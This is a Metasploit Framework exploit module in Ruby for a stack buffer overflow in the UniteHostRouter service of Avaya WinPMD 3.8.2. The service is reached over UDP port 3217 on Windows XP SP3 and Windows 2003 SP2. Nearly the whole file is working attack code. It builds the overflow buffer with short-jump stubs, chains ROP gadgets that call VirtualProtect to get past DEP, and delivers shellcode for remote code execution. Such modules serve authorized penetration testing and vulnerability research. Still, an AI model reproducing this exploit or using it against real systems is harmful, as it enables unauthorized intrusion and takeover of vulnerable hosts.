# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Avaya WinPMD UniteHostRouter Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability
        exists in the UniteHostRouter service, due to the insecure usage of memcpy when
        parsing specially crafted "To:" headers. The module has been tested successfully on
        Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2.
      },
      &#039;Author&#039;         =>
        [
          &#039;Abdul-Aziz Hariri&#039;, # Vulnerability discovery
          &#039;Abysssec&#039;, # PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;82764&#039;],
          [&#039;OSVDB&#039;, &#039;73269&#039;],
          [&#039;BID&#039;, &#039;47947&#039;],
          [&#039;EDB&#039;, &#039;18397&#039;],
          [&#039;URL&#039;, &#039;https://downloads.avaya.com/css/P8/documents/100140122&#039;],
          [&#039;URL&#039;, &#039;http://secunia.com/advisories/44062&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0d\x0a\x20\x2f\x3a\x3f",
          &#039;Space&#039; => 1024,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Avaya WinPMD 3.8.2 / Windows XP SP3&#039;,
            {
              &#039;Offset&#039; => 260,
              &#039;Ret&#039; => 0x77c2e93b # MOV EAX,EDI # POP EDI # RETN from msvcrt
            }
          ],
          [&#039;Avaya WinPMD 3.8.2 / Windows 2003 SP2&#039;,
            {
              &#039;Offset&#039; => 260,
              &#039;Ret&#039; => 0x0040e0f2 # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from UniteHostRouter.EXE
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;May 23 2011&#039;,
      &#039;DefaultTarget&#039;  => 0
      ))

    register_options([ Opt::RPORT(3217) ], self.class)
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V")[0].to_i
  end

  def nop
    return make_nops(4).unpack("V")[0].to_i
  end

  def exploit
    connect_udp

    if target.name =~ /Windows XP SP3/
      buf = "\xeb\x7f" # jmp short $+0x81
      buf << rand_text(0x81 - 2)
      buf << "\xeb\x7f" # jmp short $+0x81
      buf << rand_text(0x81 - 2)
      buf << "\xeb\x64" # jmp short $+0x66 # jmp to shellcode in the heap
      buf << [target.ret].pack("V") # MOV EAX,EDI # POP EDI # RETN # from msvcrt # EDI points to data in the heap
      buf << [0x77c5f9a0].pack("V") # Readable address with string # from msvcrt
      buf << ([0x77c3c99c].pack("V")) * 21 # (INC EAX # RETN) * 21 # from msvcrt # EAX points to data in th heap, align to shellcode position
      buf << [0x77c168cd].pack("V") # jmp eax # from msvcrt.dll # JMP to shellcode in the heap
    elsif target.name =~ /Windows 2003 SP2/
      rop_gadgets =
        [
          0x77bb2563, # POP EAX # RETN
          0x77ba1114, # <- *&VirtualProtect()
          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
          junk,
          0x77bb0c86, # XCHG EAX,ESI # RETN
          0x77bc9801, # POP EBP # RETN
          0x77be2265, # ptr to &#039;push esp #  ret&#039;
          0x77bb2563, # POP EAX # RETN
          0x03C0990F,
          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
          0x77bb48d3, # POP EBX, RET
          0x77bf21e0, # .data
          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
          0x77bbfc02, # POP ECX # RETN
          0x77bef001, # W pointer (lpOldProtect) (-> ecx)
          0x77bd8c04, # POP EDI # RETN
          0x77bd8c05, # ROP NOP (-> edi)
          0x77bb2563, # POP EAX # RETN
          0x03c0984f,
          0x77bdd441, # SUB EAX, 03c0940f
          0x77bb8285, # XCHG EAX,EDX # RETN
          0x77bb2563, # POP EAX # RETN
          nop,
          0x77be6591, # PUSHAD # ADD AL,0EF # RETN
        ].pack("V*")
      buf = rand_text(3) # padding
      buf << rop_gadgets
      buf << "\xeb\x7f" # jmp $+0x81
      buf << rand_text(0x81-2)
      buf << "\xeb\x25" # jmp short $+0x66 => to shellcode
      buf << rand_text(target[&#039;Offset&#039;] - buf.length)
      buf << "\xf2\xe0\x40" # EIP => # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from [UniteHostRouter.EXE # stackpivot to heap
    end

    request = "UTP/1 To: 127.0.0.1 /#{buf}\r\n\r\n"

    if target.name =~ /Windows 2003 SP2/
      request << "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
    end

    request << payload.encoded # The shellcode will be stored in the heap

    print_status("#{rhost}:#{rport} - Trying to exploit #{target.name}...")
    udp_sock.put(request)
    disconnect_udp
  end

end



